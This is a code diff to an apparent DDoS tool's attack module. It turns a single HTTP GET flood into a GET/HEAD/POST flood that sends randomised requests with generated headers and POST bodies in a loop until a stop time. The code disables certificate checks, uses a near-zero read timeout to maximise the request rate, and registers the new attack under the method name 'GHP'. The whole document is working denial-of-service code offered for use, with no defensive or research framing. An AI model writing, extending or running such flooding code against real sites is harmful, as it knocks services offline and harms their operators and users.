@@ -23,34 +23,43 @@ SOFTWARE.
 '''
 
 '''
-HTTP GET flood module
+HTTP GET/HEAD/POST flood
 '''
 
 import time, requests
 from src.core import Core
 from src.utils import *
 from src.useragent import *
+from random import choice
 
 def flood(attack_id, url, stoptime) -> None:
-    '''
-    launches a HTTP GET flood
-    '''
 
     while time.time() < stoptime and Core.attackrunning:
         try:
 
-            Core.session.get(
-                utils().buildblock(url), 
-                headers=utils().buildheaders(url),
+            method = choice(['GET','HEAD','POST'])
+
+            headers = utils().buildheaders(url)
+            if method == 'POST':
+                content_type, data = utils().builddata()
+                headers.update(content_type)
+            else:
+                data = None
+
+            Core.session.request(
+                method,
+                utils().buildblock(url),
+                headers=headers,
                 verify=False, 
                 timeout=(5,0.1), 
                 allow_redirects=False,
                 stream=False,
-                cert=None
+                cert=None,
+                data=data
             )
 
             Core.infodict[attack_id]['req_sent'] += 1
-        except requests.exceptions.ReadTimeout: # if we get a ReadTimeout error, we count it as sent
+        except requests.exceptions.ReadTimeout:
             Core.infodict[attack_id]['req_sent'] += 1
 
         except Exception:
@@ -59,10 +68,9 @@ def flood(attack_id, url, stoptime) -> None:
         Core.infodict[attack_id]['req_total'] += 1
     Core.threadcount -= 1
 
-# add the method to the methods dictionary
 Core.methods.update({
-    'GET': { # name, which will be used for the "-m/--method" argument
-        'info': 'HTTP GET flood, with basic customizability', # information about the attack
-        'func': flood # function
+    'GHP': {
+        'info': 'HTTP GET/HEAD/POST flood',
+        'func': flood
     }
 })
